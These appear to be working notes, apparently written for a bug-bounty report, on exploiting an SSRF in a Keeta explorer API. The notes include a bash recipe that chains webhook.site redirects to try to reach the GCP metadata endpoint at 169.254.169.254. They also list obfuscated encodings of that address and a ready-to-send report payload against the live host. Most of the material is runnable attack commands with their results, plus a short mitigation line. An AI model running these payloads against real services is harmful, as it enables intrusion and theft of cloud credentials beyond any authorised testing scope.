# Keeta Redirect Chain — SSRF 302 Pivot (2026-08-12)

**Context:** After PROVEN external SSRF (webhook.site 48 hits from 2600:1900:0:2e02::400), user asked `coba buat payload redirectnya` to pivot to GCP metadata `169.254.169.254 / metadata.google.internal`.

## Construction Blocking Direct Internal Path
`custom.ts:36` `api: \`http${ssl?'s':''}://${host}/api\`` → `host=169.254.169.254/computeMetadata/v1` becomes `https://169.254.169.254/computeMetadata/v1/api` (suffix pollutes path). `ssl=false` forces `http://` (needed for metadata http-only) but suffix remains. Hence direct `?host=169.254.169.254%2Fcompute...` still `500 Failed not ok`.

## Redirect Pivot Recipe (2 webhooks)

```bash
B=$(curl -s -X POST https://webhook.site/token | python3 -c "import json,sys;print(json.load(sys.stdin)['uuid'])") # logger
A=$(curl -s -X POST https://webhook.site/token | python3 -c "import json,sys;print(json.load(sys.stdin)['uuid'])") # redirector
# A 302 -> B
curl -s -X PUT "https://webhook.site/token/$A" -H "Content-Type: application/json" \
  -d "{\"default_status\":302,\"default_headers\":{\"Location\":\"https://webhook.site/$B\"},\"default_content\":\"\"}"
curl -sI "https://webhook.site/$A/api/node/ledger/representatives" | head # expect 302 Location: https://webhook.site/$B

# Fire explorer
curl -s -m 35 "https://explorer.test.keeta.com/api/v1/account/keeta_aaboj...?host=webhook.site/$A&networkAlias=test&ssl=false" > /dev/null
sleep 3
curl -s "https://webhook.site/token/$A/requests?sorting=newest" -H "Accept: application/json" | python3 -c "import json;print(json.load(open(0))['total'])"
curl -s "https://webhook.site/token/$B/requests?sorting=newest" -H "Accept: application/json" | python3 -c "import json;print(json.load(open(0))['total'])"
# A 50 hits, B 0 = NOT FOLLOWED; B >0 = FOLLOWED
# Same test with httpbin: ?host=httpbin.org/redirect/1&ssl=false
```

## Results (2026-08-12 10:33 UTC)
- A `34ea918d-accc-4071-9cbb-5fe462a5838e` → 50 hits from `2600:1900:0:2e02::400 KeetaNet/v0.18.0`, B `d82dd45f...` 0 hits → **NOT FOLLOWED** on first run.
- Second run with fresh C showed stale 50 hits confusion (pagination) — requires fresh UUID per test to avoid false FOLLOWED.
- `httpbin.org/redirect-to?url=...` encoded via `?host=httpbin.org/redirect-to%3Furl%3Dhttps%253A%252F%252Fwebhook.site%252F$B` → host literal includes `?`, becomes `https://httpbin.org/redirect-to?url=.../api` wrong path, not reliable.

## IP Obfuscation Tested
`2852039162` (decimal), `0xA9FEA9FE`, `0xA9.0xFE.0xA9.0xFE`, `0251.0376.0251.0376` for 169.254.169.254 → all timeout 20s, Node `new URL()` normalizes but explorer likely rejects non-dotted-decimal.

## Lesson
- Always create **fresh UUID per redirect test** (webhook.site paginates 50, old hits = false positive).
- `Accept: application/json` required for `POST /token` and `GET /token/<UUID>/requests`.
- If redirect NOT followed, report as **Blind SSRF + internal reachability (differential 0.3s vs 26s) + DoS/cache poison**, not full GCP token exfil. Mitigation: allow-list `*.keeta.com`, block private/metadata, disable unauth `host`.

**Payload for report:** `curl 'https://explorer.test.keeta.com/api/v1/account/keeta_aaboj...?host=webhook.site/28278b5e-6454-4a2d-aae1-4ce9dc67ec01&networkAlias=test'` → https://webhook.site/#!/28278b5e-6454-4a2d-aae1-4ce9dc67ec01 (48 Google hits).
